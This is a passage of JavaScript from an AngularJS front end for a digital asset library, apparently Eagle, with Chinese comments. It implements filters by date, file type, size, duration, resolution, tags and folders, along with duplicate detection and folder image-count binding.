                        if (Date.now() - image.modificationTime < ONE_DAY * 7) result = true;
                    }
                    if (eagle.filter.filterRules.import.last30day) {
                        if (Date.now() - image.modificationTime < ONE_DAY * 30) result = true;
                    }
                    if (eagle.filter.filterRules.import.last90day) {
                        if (Date.now() - image.modificationTime < ONE_DAY * 90) result = true;
                    }
                    if (eagle.filter.filterRules.import.last365day) {
                        if (Date.now() - image.modificationTime < ONE_DAY * 365) result = true;
                    }
                    if (eagle.filter.filterRules.import.usingRange) {
                        if (eagle.filter.filterRules.import.range && eagle.filter.filterRules.import.range[0] && eagle.filter.filterRules.import.range[1]) {
                            if (eagle.filter.filterRules.import.range[0] <= image.modificationTime && image.modificationTime <= eagle.filter.filterRules.import.range[1] + ONE_DAY) result = true;
                        }
                    }
                    return result;
                });
            }

            // 修改时间筛选
            if (Object.keys(eagle.filter.filterRules.mtime.selectedMonths).length > 0) {
                data = data.filter(function (image) {
                    let mtime = image.mtime || image.modificationTime;
                    let modifyDate = new Date(mtime);
                    let modifyYear = modifyDate.getFullYear();
                    let modifyMonth = ("" + (modifyDate.getMonth() + 1)).padStart(2, "0");
                    return eagle.filter.filterRules.mtime.selectedMonths[`${modifyYear}/${modifyMonth}`];
                });
            }

            if (eagle.filter.filterRules.mtime.today || eagle.filter.filterRules.mtime.yesterday || eagle.filter.filterRules.mtime.last7day || eagle.filter.filterRules.mtime.last30day || eagle.filter.filterRules.mtime.last90day || eagle.filter.filterRules.mtime.last365day || eagle.filter.filterRules.mtime.usingRange) {

                var ONE_DAY = 1000 * 60 * 60 * 24;
                let today = new Date();
                today.setHours(0,0,0);
                let todayTime = today.getTime();
                let yesterdayTime = todayTime - ONE_DAY;

                data = data.filter(function (image) {

                    var result = false;
                    var mtime = image.mtime || image.modificationTime;

                    if (eagle.filter.filterRules.mtime.today) {
                        if (mtime > todayTime) result = true;
                    }
                    if (eagle.filter.filterRules.mtime.yesterday) {
                        if (mtime < todayTime && mtime > yesterdayTime) result = true;
                    }
                    if (eagle.filter.filterRules.mtime.last7day) {
                        if (Date.now() - mtime < ONE_DAY * 7) result = true;
                    }
                    if (eagle.filter.filterRules.mtime.last30day) {
                        if (Date.now() - mtime < ONE_DAY * 30) result = true;
                    }
                    if (eagle.filter.filterRules.mtime.last90day) {
                        if (Date.now() - mtime < ONE_DAY * 90) result = true;
                    }
                    if (eagle.filter.filterRules.mtime.last365day) {
                        if (Date.now() - mtime < ONE_DAY * 365) result = true;
                    }
                    if (eagle.filter.filterRules.mtime.usingRange) {
                        if (eagle.filter.filterRules.import.range && eagle.filter.filterRules.import.range[0] && eagle.filter.filterRules.import.range[1]) {
                            if (eagle.filter.filterRules.import.range[0] <= mtime && mtime <= eagle.filter.filterRules.import.range[1] + ONE_DAY) result = true;
                        }
                    }
                    return result;
                });
            }
            
            // 类型筛选
            if (Object.keys(eagle.filter.filterRules.type).length > 0) {
                data = data.filter(function (image) {
                    if (eagle.filter.filterRules.type[image.ext]) return true;
                    if (eagle.filter.filterRules.type['video']) {
                        return VIDEO_TYPES[image.ext];
                    }
                    if (eagle.filter.filterRules.type['url']) {
                        if (image.ext == 'url' && !image.medium) return true;
                    }
                    if (eagle.filter.filterRules.type['youtube']) {
                        if (image.ext == 'url' && image.medium == 'youtube') return true;
                    }
                    if (eagle.filter.filterRules.type['vimeo']) {
                        if (image.ext == 'url' && image.medium == 'vimeo') return true;
                    }
                    if (eagle.filter.filterRules.type['bilibili']) {
                        if (image.ext == 'url' && image.medium == 'bilibili') return true;
                    }
                    if (eagle.filter.filterRules.type['audio']) {
                        return AUDIO_TYPES[image.ext];
                    }
                    if (eagle.filter.filterRules.type['powerpoint']) {
                        if (image.ext == 'ppt' || image.ext == 'pptx' || image.ext == 'potx') return true;
                    }
                    if (eagle.filter.filterRules.type['word']) {
                        if (image.ext == 'doc' || image.ext == 'docx') return true;
                    }
                    if (eagle.filter.filterRules.type['excel']) {
                        if (image.ext == 'xls' || image.ext == 'xlsx') return true;
                    }
                    if (eagle.filter.filterRules.type['font']) {
                        return FONT_TYPES[image.ext];
                    }
                    return false;
                });
            }

            // 档案大小筛选
            // 最小值
            if ($.isNumeric(eagle.filter.filterRules.file.min)) {
                var unit = 1024;
                if (eagle.filter.filterRules.file.unit == 'mb') {
                    unit = 1024 * 1024;
                }
                data = data.filter(function (image) {
                    return image.size >= parseInt(eagle.filter.filterRules.file.min * unit);
                });
            }
            // 最大值
            if ($.isNumeric(eagle.filter.filterRules.file.max)) {
                var unit = 1024;
                if (eagle.filter.filterRules.file.unit == 'mb') {
                    unit = 1024 * 1024;
                }
                data = data.filter(function (image) {
                    return image.size <= parseInt(eagle.filter.filterRules.file.max * unit);
                });
            }

            // 视频、音频长度筛选
            // 最小值
            if ($.isNumeric(eagle.filter.filterRules.duration.min)) {
                var unit = 1;
                if (eagle.filter.filterRules.duration.unit == 'h') {
                    unit = 60 * 60;
                }
                else if (eagle.filter.filterRules.duration.unit == 'm') {
                    unit = 60;
                }
                data = data.filter(function (image) {
                    return image.duration >= parseInt(eagle.filter.filterRules.duration.min * unit);
                });
            }
            // 最大值
            if ($.isNumeric(eagle.filter.filterRules.duration.max)) {
                var unit = 1;
                if (eagle.filter.filterRules.duration.unit == 'h') {
                    unit = 60 * 60;
                }
                else if (eagle.filter.filterRules.duration.unit == 'm') {
                    unit = 60;
                }
                data = data.filter(function (image) {
                    return image.duration <= parseInt(eagle.filter.filterRules.duration.max * unit);
                });
            }

            // BPM 最小值
            if ($.isNumeric(eagle.filter.filterRules.bpm.min)) {
                data = data.filter(function (image) {
                    if (!image.bpm) return false;
                    return image.bpm >= parseInt(eagle.filter.filterRules.bpm.min);
                });
            }
            // BPM 最大值
            if ($.isNumeric(eagle.filter.filterRules.bpm.max)) {
                data = data.filter(function (image) {
                    if (!image.bpm) return false;
                    return image.bpm <= parseInt(eagle.filter.filterRules.bpm.max);
                });
            }

            // 图片大小筛选
            // 宽度最小值
            if ($.isNumeric(eagle.filter.filterRules.resolution.minW)) {
                data = data.filter(function (image) {
                    return image.width >= parseInt(eagle.filter.filterRules.resolution.minW);
                });
            }
            // 宽度最大值
            if ($.isNumeric(eagle.filter.filterRules.resolution.maxW)) {
                data = data.filter(function (image) {
                    return image.width <= parseInt(eagle.filter.filterRules.resolution.maxW);
                });
            }
            // 高度最小值
            if ($.isNumeric(eagle.filter.filterRules.resolution.minH)) {
                data = data.filter(function (image) {
                    return image.height >= parseInt(eagle.filter.filterRules.resolution.minH);
                });
            }
            // 高度最大值
            if ($.isNumeric(eagle.filter.filterRules.resolution.maxH)) {
                data = data.filter(function (image) {
                    return image.height <= parseInt(eagle.filter.filterRules.resolution.maxH);
                });
            }

            // 图片标注筛选
            // 有标注
            if (eagle.filter.filterRules.annotation.has) {
                // 不需要关键字
                if (!eagle.filter.filterRules.annotation.keywords) {
                    data = data.filter(function (image) {
                        return image.comments && image.comments.length > 0;
                    });
                }
                // 需要关键字
                else {
                    var keywords = eagle.filter.filterRules.annotation.keywords.split(",");
                    data = data.filter(function (image) {
                        var matchCount = 0;
                        for (var i = 0; i < keywords.length; i++) {
                            var keyword = keywords[i].toLowerCase();
                            if (image.comments && image.comments.length > 0) {
                                for (var j = 0; j < image.comments.length; j++) {
                                    var comment = image.comments[j];
                                    if (comment.annotation.toLowerCase().indexOf(keyword) > -1) {
                                        matchCount++;
                                        break;
                                    }
                                }
                            }
                        }
                        return (matchCount == keywords.length);
                    });
                }
            }
            // 没标注
            else if (eagle.filter.filterRules.annotation.no) {
                data = data.filter(function (image) {
                    return !image.comments || image.comments.length == 0;
                });
            }

            // 图片注释筛选
            // 有注释
            if (eagle.filter.filterRules.note.has) {
                // 不需要关键字
                if (!eagle.filter.filterRules.note.keywords) {
                    data = data.filter(function (image) {
                        return image.annotation && image.annotation.length > 0;
                    });
                }
                // 需要关键字
                else {
                    var keywords = eagle.filter.filterRules.note.keywords.split(",");
                    data = data.filter(function (image) {
                        var matchCount = 0;
                        for (var i = 0; i < keywords.length; i++) {
                            var keyword = keywords[i].toLowerCase();
                            if (image.annotation && image.annotation.toLowerCase().indexOf(keyword) > -1) {
                                matchCount++;
                            }
                        }
                        return (matchCount == keywords.length);
                    });
                }
            }
            // 没注释
            else if (eagle.filter.filterRules.note.no) {
                data = data.filter(function (image) {
                    return !image.annotation || image.annotation.length == 0;
                });
            }

            // 来源网址筛选
            // 有網址
            if (eagle.filter.filterRules.url.has) {
                // 不需要关键字
                if (!eagle.filter.filterRules.url.keywords) {
                    data = data.filter(function (image) {
                        return image.url && image.url.length > 0;
                    });
                }
                // 需要关键字
                else {
                    var keywords = eagle.filter.filterRules.url.keywords.split(",");
                    data = data.filter(function (image) {
                        var matchCount = 0;
                        for (var i = 0; i < keywords.length; i++) {
                            var keyword = keywords[i].toLowerCase();
                            if (image.url && image.url.toLowerCase().indexOf(keyword) > -1) {
                                matchCount++;
                            }
                        }
                        return (matchCount == keywords.length);
                    });
                }
            }
            // 没網址
            else if (eagle.filter.filterRules.url.no) {
                data = data.filter(function (image) {
                    return !image.url || image.url.length == 0;
                });
            }

            // 方向筛选
            if (eagle.filter.filterRules.shape.landscape || eagle.filter.filterRules.shape.portrait || eagle.filter.filterRules.shape.square || eagle.filter.filterRules.shape.panoramicLandscape || eagle.filter.filterRules.shape.panoramicPortrait || eagle.filter.filterRules.shape.custom || eagle.filter.filterRules.shape['43'] || eagle.filter.filterRules.shape['34'] || eagle.filter.filterRules.shape['169'] || eagle.filter.filterRules.shape['916']) {
                data = data.filter(function (image) {
                    var result = false;
                    if (eagle.filter.filterRules.shape.landscape) {
                        if (image.width > image.height) result = true;
                    }
                    if (!result && eagle.filter.filterRules.shape.portrait) {
                        if (image.height > image.width) result = true;
                    }
                    if (!result && eagle.filter.filterRules.shape.square) {
                        if (image.width == image.height) result = true;
                    }
                    if (!result && eagle.filter.filterRules.shape.panoramicLandscape) {
                        if (image.width > image.height && image.width / image.height >= 2.5) result = true;
                    }
                    if (!result && eagle.filter.filterRules.shape.panoramicPortrait) {
                        if (image.width < image.height && image.height / image.width >= 2.5) result = true;
                    }
                    if (!result && eagle.filter.filterRules.shape['43']) {
                        if (image.width / image.height === 4 / 3) {
                            result = true;
                        }
                    }
                    if (!result && eagle.filter.filterRules.shape['34']) {
                        if (image.width / image.height === 3 / 4) {
                            result = true;
                        }
                    }
                    if (!result && eagle.filter.filterRules.shape['169']) {
                        if (image.width / image.height === 16 / 9) {
                            result = true;
                        }
                    }
                    if (!result && eagle.filter.filterRules.shape['916']) {
                        if (image.width / image.height === 9 / 16) {
                            result = true;
                        }
                    }
                    if (!result && eagle.filter.filterRules.shape.custom) {
                        if (eagle.filter.filterRules.shape.width && eagle.filter.filterRules.shape.height) {
                            if (image.width / image.height === eagle.filter.filterRules.shape.width / eagle.filter.filterRules.shape.height) {
                                result = true;
                            }
                        }
                        else {
                            result = true;
                        }
                    }
                    return result;
                });
            }

            // 星等筛选
            if (eagle.filter.filterRules.rating['5'] || eagle.filter.filterRules.rating['4'] || eagle.filter.filterRules.rating['3'] || eagle.filter.filterRules.rating['2'] || eagle.filter.filterRules.rating['1'] || eagle.filter.filterRules.rating['0']) {
                let starMap = {
                    "5": eagle.filter.filterRules.rating['5'],
                    "4": eagle.filter.filterRules.rating['4'],
                    "3": eagle.filter.filterRules.rating['3'],
                    "2": eagle.filter.filterRules.rating['2'],
                    "1": eagle.filter.filterRules.rating['1'],
                };
                data = data.filter(function (image) {
                    if (eagle.filter.filterRules.rating['0'] && !image.star) return true;
                    return starMap[image.star];
                });
            }

            // 字体筛选
            if (eagle.filter.filterRules.font.activated) {
                data = data.filter(function (image) {
                    if (!image.fontMetas) return false;
                    try {
                        var key = Object.keys(image.fontMetas.postScriptName)[0];
                        var postScriptName = image.fontMetas.postScriptName && image.fontMetas.postScriptName[key];
                        return installedFonts[`${postScriptName}_.${image.ext}`];
                    }
                    catch (err) {}
                });
            }
            else if (eagle.filter.filterRules.font.deactivated) {
                data = data.filter(function (image) {
                    if (!image.fontMetas) return false;
                    try {
                        var key = Object.keys(image.fontMetas.postScriptName)[0];
                        var postScriptName = image.fontMetas.postScriptName && image.fontMetas.postScriptName[key];
                        return !installedFonts[`${postScriptName}_.${image.ext}`];
                    }
                    catch (err) {}
                });
            }

            var selectedCameras = Object.keys(eagle.filter.filterRules.camera);
            if (selectedCameras.length > 0) {
                data = data.filter(function (image) {
                    if (image && image.rawMetas && image.rawMetas.camera) {
                        return eagle.filter.filterRules.camera[image.rawMetas.camera];
                    }
                    return false;
                });
            }

            // 颜色筛选
            if (eagle.filter.filterRules.color.value) {
                data = data.filter($scope.colorFilter);
            }
            
            // 黑白图片过滤
            if (eagle.filter.filterRules.color.gray) {
                console.time("grayColorFilter");
                data = data.filter($scope.grayColorFilter);
                console.timeEnd("grayColorFilter");
            }

            if (eagle.filter.filterRules.color.value && $scope.viewMode !== "random") {
                data = data.sort(function(a, b) {
                    var da = $scope.colorDistancesMap[a.id] || 100;
                    var db = $scope.colorDistancesMap[b.id] || 100;
                    if(da > db) return 1;
                    if(da < db) return -1;
                    return 0;
                });
            }
            
            // 关键字筛选
            if ($scope.keyword) {
                console.time("$scope.searchFilter");
                data = data.filter($scope.searchFilter);
                console.timeEnd("$scope.searchFilter");
            }

            // 已刪除時間排序
            if ($scope.viewMode === 'trash') {
                data = $filter('orderBy')(data, function(image) {
                    if (image.deletedTime) {
                        return -image.deletedTime;
                    }
                    return -image.modificationTime;
                });
            }
            else if ($scope.viewMode === 'random') {
                console.time("shuffle");
                if ($scope.shuffle.length > 0) {
                    data = $scope.shuffle.filter(function (item) {
                        return $scope.itemMappings[item.id] && !$scope.itemMappings[item.id].isDeleted;
                    });
                }
                else {
                    data.shuffle();
                    $scope.shuffle = data;
                }
                console.timeEnd("shuffle");
            }

            $scope.preelaborations = [];
            if (eagle.filter.filterBadge > 0) {
                if (eagle.filter.folderFilterLogic === "OR" || eagle.filter.tagFilterLogic === "OR") {
                    data.forEach(function (image) {
                        $scope.preelaborations.push(image);
                    });
                }
                else {
                    $scope.preelaborations = data;    
                }
            }
            else {
                $scope.preelaborations = data;
            }

            // 如果是 OR 逻辑需要保留所有 tags filter 的结果，为了计算 containTags
            if (eagle.filter.tagFilterLogic === "OR") {

                if ((eagle.filter.filterRules.tag.includes && eagle.filter.filterRules.tag.includes.length > 0) || (eagle.filter.filterRules.tag.exclude && eagle.filter.filterRules.tag.exclude.length > 0)) {
                    data = data.filter(function (image) {

                        // 包含標籤
                        if (eagle.filter.filterRules.tag.includes.length > 0) {
                            for (var i = 0; i < eagle.filter.filterRules.tag.includes.length; i++) {
                                var tag = eagle.filter.filterRules.tag.includes[i];
                                if (image.tags && image.tags.length > 0) {
                                    for (var j = 0; j < image.tags.length; j++) {
                                        if (image.tags[j] == tag) {
                                            return true;
                                        }
                                    }
                                }
                            }
                        }

                        // 排除標籤
                        if (eagle.filter.filterRules.tag.exclude.length > 0) {
                            var matchCount = 0;
                            for (var i = 0; i < eagle.filter.filterRules.tag.exclude.length; i++) {
                                var tag = eagle.filter.filterRules.tag.exclude[i];
                                if (image.tags && image.tags.length > 0) {
                                    if (image.tags.indexOf(tag) !== -1) {
                                        matchCount++;
                                    }
                                }
                            }
                            if (matchCount === 0) {
                                return true;
                            }
                        }
                        return false;
                    });

                    if (eagle.filter.filterRules.tag.no) {
                        $scope.preelaborations.forEach(function (image) {
                            if (!image.tags || image.tags.length === 0) {
                                data.push(image);
                            }
                        });
                    }
                }
                else {
                    if (eagle.filter.filterRules.tag.no) {
                        data = data.filter(function (image) {
                            return !image.tags || image.tags.length === 0;
                        });
                    }
                }
            }
            // 标签筛选（and 逻辑）
            else if (eagle.filter.tagFilterLogic === "AND" || eagle.filter.tagFilterLogic === "EQUAL") {

                // 包含標籤
                if (eagle.filter.filterRules.tag.includes && eagle.filter.filterRules.tag.includes.length > 0) {
                    data = data.filter(function (image) {
                        var matchCount = 0;
                        for (var i = 0; i < eagle.filter.filterRules.tag.includes.length; i++) {
                            var tag = eagle.filter.filterRules.tag.includes[i];
                            if (image.tags && image.tags.length > 0) {
                                for (var j = 0; j < image.tags.length; j++) {
                                    if (image.tags[j] == tag) {
                                        if (eagle.filter.tagFilterLogic === "EQUAL") {
                                            if (image.tags.length === eagle.filter.filterRules.tag.includes.length) {
                                                matchCount++;
                                            }
                                        }
                                        else {
                                            matchCount++;
                                        }
                                        break;
                                    }
                                }
                            }
                        }
                        return (matchCount == eagle.filter.filterRules.tag.includes.length);
                    });
                }

                // 排除標籤
                if (eagle.filter.filterRules.tag.exclude && eagle.filter.filterRules.tag.exclude.length > 0) {
                    data = data.filter(function (image) {
                        for (var i = 0; i < eagle.filter.filterRules.tag.exclude.length; i++) {
                            var tag = eagle.filter.filterRules.tag.exclude[i];
                            if (image.tags && image.tags.length > 0) {
                                if (image.tags.indexOf(tag) !== -1) {
                                    return false;
                                }
                            }
                        }
                        return true;
                    });
                }

                // 没标签筛选
                if (eagle.filter.filterRules.tag.no) {
                    data = data.filter(function (image) {
                        return !image.tags || image.tags.length === 0;
                    });
                }
            }

            // 筛选器文件夹
            // OR
            if (eagle.filter.folderFilterLogic === "OR") {

                var filterFolders = Object.values(eagle.filter.filterRules.folder.includes).map(function (folder) { return folder; });
                var excludeFolders = Object.values(eagle.filter.filterRules.folder.exclude).map(function (folder) { return folder; });

                if (filterFolders.length > 0 || excludeFolders.length > 0) {

                    data = data.filter(function (image) {

                        // 包含文件夹
                        if (filterFolders.length > 0) {
                            for (var i = 0; i < filterFolders.length; i++) {
                                var folderId = filterFolders[i].id;
                                if (folderId === "NoFolders" && image.folders.length === 0) {
                                    return true;
                                }
                                if (folderId && image.folders && image.folders.length > 0) {
                                    for (var j = 0; j < image.folders.length; j++) {
                                        if (image.folders[j] == folderId) {
                                            return true;
                                        }
                                    }
                                }
                            }
                        }

                        // 排除文件夹
                        if (excludeFolders.length > 0) {
                            var matchCount = 0;
                            for (var i = 0; i < excludeFolders.length; i++) {
                                var folderId = excludeFolders[i].id;
                                if (folderId === "NoFolders" && image.folders.length === 0) {
                                    matchCount++;
                                }
                                if (image.folders && image.folders.length > 0) {
                                    if (image.folders.indexOf(folderId) !== -1) {
                                        matchCount++;
                                    }
                                }
                            }
                            if (matchCount === 0) {
                                return true;
                            }
                        }

                        return false;
                    });
                }
            }
            // AND
            else if (eagle.filter.folderFilterLogic === "AND" || eagle.filter.folderFilterLogic === "EQUAL") {

                var filterFolders = Object.values(eagle.filter.filterRules.folder.includes).map(function (folder) { return folder; });
                var excludeFolders = Object.values(eagle.filter.filterRules.folder.exclude).map(function (folder) { return folder; });

                // 包含文件夹
                if (filterFolders.length > 0) {
                    data = data.filter(function (image) {
                        var matchCount = 0;
                        for (var i = 0; i < filterFolders.length; i++) {
                            var folder = filterFolders[i];
                            var folderId = folder.id;
                            if (folderId === "NoFolders" && image.folders.length === 0) {
                                matchCount++;
                            }
                            if (folder && image.folders && image.folders.length > 0) {
                                for (var j = 0; j < image.folders.length; j++) {
                                    if (image.folders[j] == folder.id) {
                                        if (eagle.filter.folderFilterLogic === "EQUAL") {
                                            if (image.folders.length === filterFolders.length) {
                                                matchCount++;
                                            }
                                        }
                                        else {
                                            matchCount++;
                                        }
                                        break;
                                    }
                                }
                            }
                        }
                        return (matchCount === filterFolders.length);
                    });
                }

                // 排除文件夹
                if (excludeFolders.length > 0) {
                    data = data.filter(function (image) {
                        for (var i = 0; i < excludeFolders.length; i++) {
                            var folderId = excludeFolders[i].id;
                            if (folderId === "NoFolders" && image.folders.length === 0) {
                                return false;
                            }
                            if (image.folders && image.folders.length > 0) {
                                if (image.folders.indexOf(folderId) !== -1) {
                                    return false;
                                }
                            }
                        }
                        return true;
                    });
                }
            }

            // 如果沒有使用加密文件夾，就不需要判斷這件事情
            if (Object.keys($scope.lockedImages).length > 0) {
                data = data.filter($scope.lockImageFilter);
            }

            // 文件夹有自己的排序方式
            if (!$rootScope.selectedFolders.length && $scope.currentFolder && $scope.currentFolder.orderBy) {
                if ($scope.orderBy !== "IMPORT" || $scope.currentFolder.orderBy !== $scope.orderBy) {
                    data = $scope.sortData(data, $scope.currentFolder.orderBy);
                }
                if (!$scope.currentFolder.sortIncrease) {
                    data = data.reverse();
                }
            }

            // 智能文件夹有自己的排序方式
            else if ($scope.currentSmartFolder && $scope.currentSmartFolder.orderBy) {
                if ($scope.currentSmartFolder.orderBy !== $scope.orderBy) {
                    data = $scope.sortData(data, $scope.currentSmartFolder.orderBy);
                }
                if (!$scope.currentSmartFolder.sortIncrease) {
                    data = data.reverse();
                }
            }
            else if (!$scope.sortIncrease && !eagle.filter.filterRules.color.value) {
                data = data.reverse();
            }

            if ($scope.viewMode === 'recent') {
                data = data.sort(function (a, b) {
                    return RecentFileManager.recentFilesOrder[a.id] - RecentFileManager.recentFilesOrder[b.id];
                });
            }

            return data;
        }

        $scope.findDupclipate = function(currentFolder, hasColorInfo) {

            var duplicates = [];
            var pushedMapping = {};
            var duplicateMappings = {};

            $scope.duplicates = [];
            $scope.duplicateGroupings = {};

            if (!$scope.raw) return;

            if (!hasColorInfo) {
                duplicateMappings = $scope.duplicateMappings;
            }
            else {
                duplicateMappings = {};
            }

            $scope.duplicateTarget = currentFolder;

            // 全部圖片
            if (!currentFolder) {
                // 建立查詢表
                eagle.filter.filterExtensions = {};
                eagle.filter.filterCamerasMapping = {};
                for (var rindex = $scope.raw.length - 1; rindex >= 0; rindex--) {
                    var image = $scope.raw[rindex];

                    // Note: 这部分原来放在 rebindRefresh 中，因为不需要重复计算，故放在这里
                    switch (image.ext) {
                        case '360':
                        case 'mp4':
                        case 'mov':
                        case 'webm':
                        case 'mkv':
                        case 'avi':
                        case 'wmv':
                        case 'mpg':
                            eagle.filter.filterExtensions['video'] = true;
                            break;
                        case 'ppt':
                        case 'pptx':
                        case 'potx':
                            eagle.filter.filterExtensions['powerpoint'] = true;
                            break;
                        case 'doc':
                        case 'docx':
                            eagle.filter.filterExtensions['word'] = true;
                            break;
                        case 'xls':
                        case 'xlsx':
                            eagle.filter.filterExtensions['excel'] = true;
                            break;
                        case 'ttf':
                        case 'otf':
                        case 'ttc':
                       	case 'woff':
                       	case 'woff2':
                            eagle.filter.filterExtensions['font'] = true;
                            break;
                        case 'arw':
                        case 'cr2':
                        case 'cr3':
                        case 'crw':
                        case 'dng':
                        case 'erf':
                        case 'nef':
                        case 'nrw':
                        case 'mrw':
                        case 'orf':
                        case 'pef':
                        case 'raf':
                        case 'raw':
                        case 'rw2':
                        case 'sr2':
                        case 'srw':
                        case 'x3f':
                            eagle.filter.filterExtensions['raw'] = true;
                            eagle.filter.filterExtensions[image.ext] = true;
                            break;
                        case 'mp3':
                        case 'wav':
                        case 'ogg':
                        case 'flac':
                        case 'm4a':
                        case 'aac':
                            eagle.filter.filterExtensions[image.ext] = true;
                            eagle.filter.filterExtensions['audio'] = true;
                            break;
                        default:
                            eagle.filter.filterExtensions[image.ext] = true;
                    }

                    if (image.rawMetas) {
                        eagle.filter.filterCamerasMapping[image.rawMetas.camera] = true;
                    }

                    var hashID = getHashID(image, hasColorInfo);
                    if (!hashID) continue;
                    if (image.ext === 'svg') continue;
                    if (image.ext === 'tif') continue;
                    if (image.ext === 'tiff') continue;
                    if (image.isDeleted) continue;

                    // NOTE: 如果是用户主动扫描，才计算图片去重复
                    if (hasColorInfo) {
                        if (!$scope.duplicateGroupings[hashID]) {
                            $scope.duplicateGroupings[hashID] = [];
                        }
                        $scope.duplicateGroupings[hashID].push(image);
                    }

                    // 如果有東西，裡面的東西跟自己都是那個重複者
                    if (!duplicateMappings[hashID]) {
                        duplicateMappings[hashID] = image;
                    } else {
                        // Note: 下面注解的代码严重影响效能
                        // 优化版
                        if (!pushedMapping[hashID]) {
                            duplicates.push(duplicateMappings[hashID]);
                        }
                        pushedMapping[hashID] = true;
                        duplicates.push(image);
                    }
                }

                if (Object.keys(eagle.filter.filterCamerasMapping).length > 0) {
                    eagle.filter.filterCameras = Object.keys(eagle.filter.filterCamerasMapping);
                    eagle.filter.filterCameras = eagle.filter.filterCameras.sort(function(a, b) {
                        if(a > b) return 1;
                        if(a < b) return -1;
                        return 0;
                    });
                }
            }
            else {

                var images = $scope.getFolderImages(currentFolder, $scope.showSubfolderContent);
                for (var rindex = images.length - 1; rindex >= 0; rindex--) {

                    var image = images[rindex];
                    var hashID = getHashID(image, hasColorInfo);
                    if (!hashID) continue;
                    if (image.ext === 'svg') continue;
                    if (image.ext === 'tif') continue;
                    if (image.ext === 'tiff') continue;
                    if (image.isDeleted) continue;

                    if (hasColorInfo) {
                        if (!$scope.duplicateGroupings[hashID]) {
                            $scope.duplicateGroupings[hashID] = [];
                        }
                        $scope.duplicateGroupings[hashID].push(image);
                    }

                    // 如果有東西，裡面的東西跟自己都是那個重複者
                    if (!duplicateMappings[hashID]) {
                        duplicateMappings[hashID] = image;
                    } else {
                        // 优化版
                        if (!pushedMapping[hashID]) {
                            duplicates.push(duplicateMappings[hashID]);
                        }
                        pushedMapping[hashID] = true;
                        duplicates.push(image);
                    }
                }
            }

            $scope.duplicates = duplicates;

            if (hasColorInfo) {
                var duplicateGroupings = Object.keys($scope.duplicateGroupings).map(function(key) { return $scope.duplicateGroupings[key]; });
                duplicateGroupings = duplicateGroupings.filter(function(group) {
                    return group.length > 1;
                });
                $scope.duplicateGroupings = duplicateGroupings;
            }
        };

        var muteCalcuteImageBindingTimeout;
        var muteCalcuteImageBindingTimeoutDuration = 4000;
        function muteCalcuteImageBinding (params, callback) {
            if (!muteCalcuteImageBindingTimeout) {
                muteCalcuteImageBindingTimeoutDuration = 200;
                console.log(`muteCalcuteImageBindingTimeoutDuration = 200;`)
            }
            else {
                muteCalcuteImageBindingTimeoutDuration = 4000;
                console.log(`muteCalcuteImageBindingTimeoutDuration = 4000;`)
            }
            clearTimeout(muteCalcuteImageBindingTimeout);
            muteCalcuteImageBindingTimeout = setTimeout(function () {
                $scope.calculateImageBinding(params, callback);
                muteCalcuteImageBindingTimeout = undefined;
            }, params.timeout || muteCalcuteImageBindingTimeoutDuration);
        };

        var pinyinCache = {};

        var calculateImageBindingTimeout;
        $scope.calculateImageBinding = function(params = { ignoreSort : false }, callback) {

            var duration = 50;
            if (calculateImageBindingTimeout) {
                duration = 50;
            } else {
                duration = 1;
            }
            if (TagManager.azGroups) {
                $timeout.cancel(calculateImageBindingTimeout);
            }
            calculateImageBindingTimeout = $timeout(function() {

                try {

                    if (!$scope.raw) return;

                    if (!params.ignoreSort) {
                        $scope.sortRawData($scope.orderBy);
                    }

                    console.time("calculateImageBinding");
                    var path = require('path');
                    var tags = {};
                    var exts = {};
                    $scope.all = [];
                    $scope.untagged = [];
                    $scope.unfiledCount = 0;
                    $scope.untaggedCount = 0;
                    $scope.trash = [];
                    $scope.folderMappings = {};
                    $scope.tagsSuggestion = [];
                    $scope.folderList = [];
                    $scope.lockedImages = {};

                    let ancestorsCache = {};
                    let defaultFolderCoverIdMap = {};

                    eagle.utils.tree.walk($scope.folders, 'children', function(folder, parent, depth) {

                        if (folder && parent) {
                            folder.parent = parent.id;
                        }

                        // 列表版本 Folders
                        $scope.folderList.push(folder);

                        // 去除重複的資料夾
                        folder.children = $filter('unique')(folder.children, 'id');
                        folder.imagesMappings = {};
                        folder.images = [];
                        folder.imageCount = 0;
                        folder.depth = depth;
                        folder.descendantImageCount = 0;

                        if (!folder.pinyin && typeof folder.name === "string") {
                            folder.pinyin = tinyPinyin.convertToPinyin(folder.name);
                        }

                        if (folder.tags && folder.tags.length > 0) {
                            folder.tags.forEach(function(tag) {
                                $scope.tagsSuggestion.push({
                                    value: tag,
                                    text: tag
                                });
                            });
                        }

                        ancestorsCache[folder.id] = getAncestorFolders(folder, [folder]);

                        $scope.folderMappings[folder.id] = folder;
                    });

                    eagle.utils.tree.walk($scope.folders, 'children', function(folder, parent) {
                        folder.extendTags = getExtendTags(folder, []);
						folder.covers = [];
                    });


                    eagle.utils.tree.walk($scope.smartFolders, 'children', function (smartFolder, parent, depth) {
                        $scope.smartFolderMappings[smartFolder.id] = smartFolder;
                    });

                    // 重新建立圖片關係
                    for (var rindex = 0; rindex < $scope.raw.length; rindex++) {
                        var image = $scope.raw[rindex];

                        if (!$scope.itemMappings[image.id]) {
                            $scope.itemMappings[image.id] = image;
                        }

                        if (image.isDeleted) {
                            $scope.trash.push(image);
                        }
						else {

                            // 計算資料夾圖片總數
                            if (image.folders && image.folders.length > 0) {
                                var increaseAncestors = {};
                                image.folders.forEach(function(folderId) {
                                    var folder = $scope.folderMappings[folderId];
                                    if (folder) {
                                        folder.imageCount++;

                                        if (folder.password && !folder.isUnLock) {
                                            $scope.lockedImages[image.id] = true;
                                        }

                                        // 祖先们也都 + 1 , 记录在其他栏位上
                                        var ancestors = ancestorsCache[folder.id] || getAncestorFolders(folder, [folder]);
                                        ancestors.forEach(function (ancestor) {
                                            // 避免重复加总
                                            if (increaseAncestors[ancestor.id]) {
                                                return;
                                            }
                                            if (!ancestor.descendantImageCount) ancestor.descendantImageCount = 0;
                                            ancestor.descendantImageCount++;
                                            increaseAncestors[ancestor.id] = true;

                                            if (ancestor.password && !ancestor.isUnLock) {
                                                $scope.lockedImages[image.id] = true;
                                            }
                                        });
                                    }
                                });
                            }

                            if (!$scope.lockedImages[image.id]) {
                                $scope.all.push(image);
                                exts[image.ext] = true;
                                if (image.tags && image.tags.length == 0) {
                                    $scope.untaggedCount++;
                                }

                                if (!image.folders) {
                                    $scope.unfiledCount++;
                                }
                                else if (image.folders.length === 0) {
                                    $scope.unfiledCount++;
                                }
                                else {
                                    // 修复异常 folders
                                    if (image.folders.length === 1 && !$scope.folderMappings[image.folders[0]]) {
